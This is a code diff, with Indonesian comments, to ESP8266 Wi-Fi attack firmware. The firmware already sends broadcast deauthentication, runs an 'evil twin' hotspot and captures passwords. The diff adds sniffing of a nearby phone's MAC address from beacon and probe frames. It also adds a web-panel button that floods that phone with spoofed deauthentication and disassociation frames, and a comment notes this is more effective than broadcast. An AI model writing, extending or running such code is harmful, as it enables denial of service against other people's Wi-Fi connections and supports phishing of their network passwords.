@@ -193,6 +193,9 @@ bool deauthing_active = false;
 bool deauthAll = false;      // true = putar semua AP hasil scan
 uint8_t rrIdx = 0;           // penunjuk round-robin untuk mode "semua"
 int8_t singleIdx = -1;       // >=0 = mode tunggal: hanya BSSID indeks ini
+bool   targetHp = false;     // true = deauth ditujukan ke MAC HP (addr1), bukan broadcast
+uint8_t hpMac[6] = {0};      // MAC HP target (mode targetHp)
+uint8_t hpCh = 0;            // channel tempat HP itu terlihat
 
 String _correct     = "";
 String _tryPassword = "";
@@ -204,6 +207,12 @@ String twinSuffix   = "5G";    // akhiran nama; kosong = clone persis
 unsigned long now = 0, wifinow = 0, deauth_now = 0, oled_now = 0, chNow = 0;
 unsigned long sentFrames = 0;
 volatile uint32_t sniffFrames = 0;
+volatile uint8_t sniffType = 0;
+volatile uint8_t sniffMac[6] = {0};
+uint8_t lastMac[6] = {0};
+uint32_t lastMacSeen = 0;
+uint16_t lastMacHits = 0;
+uint8_t lastMacCh = 0;
 
 int  btnRaw = 0, btnLastVal = 0, btnCand = -1, btnCandCnt = 0;
 const char* btnLast = "-";
@@ -333,6 +342,7 @@ void stopHotspot(){
 
 void stopAll(){
   deauthing_active = false;
+  targetHp = false;
   wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
   if(hotspot_active) stopHotspot();
   oledStatus("semua stop");
@@ -405,6 +415,11 @@ String panelHtml(){
   _html += "</button></form>";
   _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?deauth=all'>"
            "<button style='background:#8a3b12'>Deauth Semua</button></form>";
+  _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?deauth=hp'>";
+  bool hpAda = memcmp(lastMac, "\0\0\0\0\0\0", 6) != 0 && lastMacCh != 0;
+  _html += "<button style='background:#0b63c5'";
+  if(!hpAda) _html += " disabled";
+  _html += ">Deauth HP (" + bytesToStr(lastMac, 6) + ")</button></form>";
 
   if(hotspot_active){
     _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?hotspot=stop'>"
@@ -454,7 +469,7 @@ String panelHtml(){
   _html += "<script>setInterval(async function(){try{let s=await (await fetch('/api/status')).json();"
            "document.getElementById('mon').textContent='up '+s.up+'s | heap '+s.heap+' | target '"
            "+s.target+' | deauth '+s.deauth+' | twin '+s.twin+' | pkt '+s.pkt+' | sniff '+s.sniff+' | btn '+s.btn+' ('+s.btnRaw+')"
-           "+' | pass '+(s.pass?'***':'-');}catch(e){}},2000);</script>";
+           "+' | pass '+(s.pass?'***':'-')+'\\nlast MAC '+s.sniffMac+' ch'+s.sniffCh+' x'+s.sniffHits+' '+s.sniffAge+'s';}catch(e){}},2000);</script>";
   _html += "</div></body></html>";
   return _html;
 }
@@ -528,7 +543,14 @@ void handleStatus(){
              ",\"deauth\":" + String(deauthing_active ? "\"ON\"" : "\"off\"") +
              ",\"twin\":" + String(hotspot_active ? "\"ON\"" : "\"off\"") +
              ",\"pkt\":" + String(sentFrames) +
-             ",\"sniff\":" + String(sniffFrames) +
+             ",\"sniff\":\"" + String(sniffFrames) + "\"" +
+             ",\"sniffMac\":\"" + String(bytesToStr(lastMac, 6)) + "\"" +
+             ",\"sniffHits\":" + String(lastMacHits) +
+             ",\"sniffAge\":" + String((millis() - lastMacSeen)/1000) +
+             ",\"sniffCh\":" + String(lastMacCh) +
+             ",\"targetHp\":" + String(targetHp ? "true" : "false") +
+             ",\"hpMac\":\"" + String(bytesToStr(hpMac, 6)) + "\"" +
+             ",\"hpCh\":" + String(hpCh) +
              ",\"btn\":\"" + String(btnLast) + "\"" +
              ",\"btnRaw\":" + String(btnRaw) +
              ",\"pass\":\"" + (_tryPassword.length() ? "***" : "") + "\"" +
@@ -559,6 +581,11 @@ void handleResult(){
 void handleIndex(){
   if(webServer.hasArg("sniffreset")){
     sniffFrames = 0;
+    memset(lastMac, 0, 6);
+    lastMacHits = 0;
+    lastMacCh = 0;
+    memset(hpMac, 0, 6);
+    hpCh = 0;
     webServer.send(200, "text/html", panelHtml());
     return;
   }
@@ -608,10 +635,23 @@ void handleIndex(){
       deauthing_active = true;
       rrIdx = 0;
       oledStatus(deauthAll ? "deauth SEMUA" : "deauth target");
+    } else if(d == "hp"){
+      singleIdx = -1; deauthAll = false;
+      const uint8_t zero[6] = {0};
+      if(memcmp(lastMac, zero, 6) == 0 || lastMacCh == 0){
+        webServer.send(400, "text/plain", "Belum ada HP ke-sniff, tunggu DeepScan");
+        return;
+      }
+      memcpy(hpMac, lastMac, 6);
+      hpCh = lastMacCh;
+      targetHp = true;
+      deauthing_active = true;
+      oledStatus("deauth HP " + bytesToStr(hpMac, 6));
     } else {
       deauthing_active = false;
       deauthAll = false;
       singleIdx = -1;
+      targetHp = false;
       wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
       oledStatus("deauth off");
     }
@@ -659,7 +699,48 @@ void handleIndex(){
 }
 
 void sniffer(uint8_t *buf, uint16_t len){
+  // SDK 2.2: buf[0..11] = RX control, frame 802.11 mulai di buf[12]
+  // (sama seperti Scan.cpp di esp8266_deauther upstream).
   sniffFrames++;
+  if(len < 36) return;                 // 12 header + 24 MAC header
+  const uint8_t type = buf[12] & 0xFC;
+  if(type != 0x80 && type != 0x40 && type != 0x50) return; // beacon/probe only
+  sniffType = type;
+  lastMacCh = wifi_get_channel();      // channel RX asli, dipakai collectSniffMac()
+  for(uint8_t i = 0; i < 6; i++) sniffMac[i] = buf[22 + i]; // addr2
+}
+
+void collectSniffMac(uint8_t ch){
+  if(sniffType == 0) return;
+  const uint8_t type = sniffType;
+  uint8_t mac[6];
+  uint8_t fch = lastMacCh;            // channel RX asli frame (diisi sniffer)
+  noInterrupts();
+  memcpy(mac, (const void*)sniffMac, 6);
+  sniffType = 0;
+  interrupts();
+
+  if(memcmp(mac, lastMac, 6) == 0){
+    lastMacHits++;
+    lastMacSeen = millis();
+    return;
+  }
+  // MAC baru harus terlihat 2x dulu (buang norak dari frame sekali lewat).
+  static uint8_t candMac[6] = {0};
+  static uint8_t candCnt = 0;
+  if(memcmp(mac, candMac, 6) != 0){
+    memcpy(candMac, mac, 6);
+    candCnt = 1;
+    return;
+  }
+  if(++candCnt < 2) return;
+
+  memcpy(lastMac, mac, 6);
+  lastMacHits = 1;
+  lastMacSeen = millis();
+  lastMacCh = fch;                     // channel asli frame, bukan hopping counter
+  Serial.printf("[ZT] SNIFF %s ch=%d type=0x%02X\n", bytesToStr(mac, 6).c_str(), fch, type);
+  oledStatus("sniff " + bytesToStr(mac, 6));
 }
 
 // ---------------- setup / loop ---------------------------------------------
@@ -703,6 +784,7 @@ void setup(){
 //     frame yang di-queue (ini yang bikin burst versi lama nyaris tidak keluar)
 //   * menyapu seluruh daftar AP tiap putaran untuk mode "semua"
 // ============================================================================
+// addr1 = broadcast; addr2/addr3 = BSSID AP. Mode "AP" (broadcast).
 void sendFrame(const uint8_t* bssid, uint8_t type, uint8_t reason){
   uint8_t f[26] = { type, 0x00, 0x00, 0x00,
                     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -710,6 +792,22 @@ void sendFrame(const uint8_t* bssid, uint8_t type, uint8_t reason){
                     0, 0, 0, 0, 0, 0,
                     0x00, 0x00, reason, 0x00 };
   memcpy(&f[10], bssid, 6);
+  memcpy(&f[16], bssid, 6);
+  wifi_send_pkt_freedom(f, sizeof(f), 0);
+  sentFrames++;
+}
+
+// Mode "HP": addr1 = MAC HP, addr2 = MAC HP (pengirim pura-pura AP), addr3 = BSSID AP.
+// Frame terlihat oleh HP sebagai deauth dari AP-nya sendiri -> jauh lebih mempan
+// daripada broadcast (HP modern kadang abaikan frame deauth broadcast).
+void sendFrameTo(const uint8_t* sta, const uint8_t* bssid, uint8_t type, uint8_t reason){
+  uint8_t f[26] = { type, 0x00, 0x00, 0x00,
+                    0, 0, 0, 0, 0, 0,          // addr1 = MAC HP
+                    0, 0, 0, 0, 0, 0,          // addr2 = MAC HP (pengirim)
+                    0, 0, 0, 0, 0, 0,          // addr3 = BSSID AP
+                    0x00, 0x00, reason, 0x00 };
+  memcpy(&f[4],  sta, 6);
+  memcpy(&f[10], sta, 6);
   memcpy(&f[16], bssid, 6);
   wifi_send_pkt_freedom(f, sizeof(f), 0);
   sentFrames++;
@@ -729,6 +827,16 @@ void hitAp(uint8_t idx, uint8_t n){
 void deauthSingleStep(){
   if(singleIdx < 0) return;
   hitAp((uint8_t)singleIdx, 16);
+}
+
+// Mode HP: tembak MAC HP yang di-sniff. addr1 = MAC HP, addr3 = BSSID AP target.
+void deauthHpStep(){
+  const uint8_t zero[6] = {0};
+  if(!targetHp || hpCh == 0 || memcmp(hpMac, zero, 6) == 0) return;
+  wifi_set_channel(hpCh);
+  delay(1);
+  for(uint8_t k = 0; k < 16; k++){ sendFrameTo(hpMac, _selectedNetwork.bssid, 0xC0, 2); delay(1); }
+  for(uint8_t k = 0; k < 16; k++){ sendFrameTo(hpMac, _selectedNetwork.bssid, 0xA0, 2); delay(1); }
 }
 
 // Mode TARGET: SSID terpilih + semua BSSID kembarannya (2.4G/5G/repeater).
@@ -764,18 +872,20 @@ void loop(){
   webServer.handleClient();
   handleButtons();
   static uint8_t ch = 1;
-
-  if(deauthing_active && (deauthAll || _selectedNetwork.ssid.length()) && millis() - deauth_now >= 150){
-    if(singleIdx >= 0)  deauthSingleStep();
-    else if(deauthAll)  deauthAllStep();
-    else                deauthBurst();
-    deauth_now = millis();
-  }
-
-  if (!deauthing_active && millis() - chNow > 200){
+  if(!deauthing_active && millis() - chNow > 200){
     wifi_set_channel(ch);
+    lastMacCh = ch;
     ch = (ch%13) + 1;
     chNow = millis();
+  }
+  collectSniffMac(ch - 1);
+
+  if(deauthing_active && (deauthAll || targetHp || _selectedNetwork.ssid.length()) && millis() - deauth_now >= 150){
+    if(singleIdx >= 0)       deauthSingleStep();
+    else if(deauthAll)       deauthAllStep();
+    else if(targetHp)        deauthHpStep();
+    else                     deauthBurst();
+    deauth_now = millis();
   }
 
   if(millis() - now >= 15000){ if(!deauthing_active) performScan(); now = millis(); }
